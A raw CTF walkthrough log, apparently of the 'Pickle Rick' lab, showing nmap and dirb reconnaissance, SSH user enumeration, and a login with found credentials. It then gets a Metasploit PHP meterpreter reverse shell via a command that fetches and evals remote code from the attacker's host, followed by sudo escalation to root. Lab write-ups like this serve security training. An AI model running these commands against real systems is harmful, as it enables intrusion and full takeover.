@@ -1,0 +1,245 @@
+IP:10.10.239.57
+
+Nmap scan results:
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop# nmap -A -T4 10.10.239.57
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-12 21:18 IST
+Nmap scan report for 10.10.239.57
+Host is up (0.14s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 eb:22:3e:f6:ed:6a:62:3b:f9:ce:c1:d7:62:3a:77:25 (RSA)
+|   256 84:b8:2e:18:9f:9c:bf:7b:82:a2:ef:ff:37:6e:52:ee (ECDSA)
+|_  256 f3:b7:87:b5:c1:3c:9d:0f:53:fa:2b:9a:fe:d6:50:7a (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Rick is sup4r cool
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=11/12%OT=22%CT=1%CU=30325%PV=Y%DS=2%DC=T%G=Y%TM=5FAD59
+OS:82%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=RD%II=I%TS=8)O
+OS:PS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505S
+OS:T11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)E
+OS:CN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
+OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
+OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
+OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=
+OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%
+OS:CD=S)
+
+
+
+
+  <!--
+
+    Note to self, remember username!
+
+    Username: R1ckRul3s
+
+  -->
+
+msf6 auxiliary(scanner/ssh/ssh_enumusers) > set username R1ckRul3s
+username => R1ckRul3s
+msf6 auxiliary(scanner/ssh/ssh_enumusers) > set rhosts 10.10.239.57
+rhosts => 10.10.239.57
+msf6 auxiliary(scanner/ssh/ssh_enumusers) > run
+
+[*] 10.10.239.57:22 - SSH - Using malformed packet technique
+[*] 10.10.239.57:22 - SSH - Starting scan
+[+] 10.10.239.57:22 - SSH - User 'R1ckRul3s' found
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_enumusers) >
+
+
+Wubbalubbadubdub
+
+FOund this under robots.txt
+
+
+root@LAPTOP-U5913CMD:/home/akshay# dirb http://10.10.239.57
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Thu Nov 12 21:49:41 2020
+URL_BASE: http://10.10.239.57/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://10.10.239.57/ ----
+==> DIRECTORY: http://10.10.239.57/assets/                                                                              
++ http://10.10.239.57/index.html (CODE:200|SIZE:1062)                                                                   
++ http://10.10.239.57/robots.txt (CODE:200|SIZE:17)                                                                     
++ http://10.10.239.57/server-status (CODE:403|SIZE:300)                                                                 
+                                                                                                                        
+---- Entering directory: http://10.10.239.57/assets/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+-----------------
+END_TIME: Thu Nov 12 22:03:06 2020
+DOWNLOADED: 4612 - FOUND: 3
+
+
+root@LAPTOP-U5913CMD:/home/akshay# dirb http://10.10.223.245 -X .php
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Thu Nov 12 22:50:44 2020
+URL_BASE: http://10.10.223.245/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://10.10.223.245/ ----
++ http://10.10.223.245/denied.php (CODE:302|SIZE:0)                                                                     
++ http://10.10.223.245/login.php (CODE:200|SIZE:882)                                                                    
++ http://10.10.223.245/portal.php (CODE:302|SIZE:0)                                                                     
+                                                                                                                        
+(!) FATAL: Too many errors connecting to host
+    (Possible cause: COULDNT CONNECT)
+
+-----------------
+END_TIME: Thu Nov 12 22:59:49 2020
+DOWNLOADED: 3569 - FOUND: 3
+
+
+So we got login.php
+
+Username:R1ckRul3s
+Password might be Wubbalubbadubdub
+
+Yea we can execute some of the commands:
+
+10.10.223.245/portal.php
+
+Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+portal.php
+robots.txt
+
+msf6 exploit(multi/script/web_delivery) > set target 1
+target => 1
+msf6 exploit(multi/script/web_delivery) > options
+
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (python/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   PHP
+
+
+msf6 exploit(multi/script/web_delivery) > set lhost tun0
+lhost => 10.9.81.62
+msf6 exploit(multi/script/web_delivery) > run
+
+[-] Exploit failed: python/meterpreter/reverse_tcp is not a compatible payload.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
+payload => php/meterpreter/reverse_tcp
+msf6 exploit(multi/script/web_delivery) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.9.81.62:4444
+[*] Using URL: http://0.0.0.0:8080/doG2i51d7s
+msf6 exploit(multi/script/web_delivery) > [*] Local IP: http://172.22.216.115:8080/doG2i51d7s
+[*] Server started.
+[*] Run the following command on the target machine:
+php -d allow_url_fopen=true -r "eval(file_get_contents('http://10.9.81.62:8080/doG2i51d7s', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"
+[*] 10.10.223.245    web_delivery - Delivering Payload (1111 bytes)
+[*] Sending stage (39282 bytes) to 10.10.223.245
+[*] Meterpreter session 1 opened (10.9.81.62:4444 -> 10.10.223.245:40148) at 2020-11-12 22:55:21 +0530
+
+
+
+meterpreter > sysinfo
+Computer    : ip-10-10-223-245
+OS          : Linux ip-10-10-223-245 4.4.0-1072-aws #82-Ubuntu SMP Fri Nov 2 15:00:21 UTC 2018 x86_64
+Meterpreter : php/linux
+meterpreter > shell
+Process 1489 created.
+Channel 0 created.
+python3 -c "import pty;pty.spawn('/bin/bash')"
+www-data@ip-10-10-223-245:/var/www/html$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@ip-10-10-223-245:/var/www/html$
+
+cat Sup3rS3cretPickl3Ingred.txt
+mr. meeseek hair
+
+
+www-data@ip-10-10-223-245:/home/rick$ cat "sec
+cat "second ingredients"
+1 jerry tear
+
+www-data@ip-10-10-223-245:/home/rick$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on
+    ip-10-10-223-245.eu-west-1.compute.internal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on
+        ip-10-10-223-245.eu-west-1.compute.internal:
+    (ALL) NOPASSWD: ALL
+www-data@ip-10-10-223-245:/home/rick$ sudo bash
+sudo bash
+root@ip-10-10-223-245:/home/rick# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@ip-10-10-223-245:/home/rick# cd /root
+lcd /root
+root@ip-10-10-223-245:~# s -la
+ls -la
+total 28
+drwx------  4 root root 4096 Feb 10  2019 .
+drwxr-xr-x 23 root root 4096 Nov 12 17:18 ..
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root 4096 Feb 10  2019 .ssh
+-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
+drwxr-xr-x  3 root root 4096 Feb 10  2019 snap
+root@ip-10-10-223-245:~# cat 3rd.txt
+cat 3rd.txt
+3rd ingredients: fleeb juice
+root@ip-10-10-223-245:~#
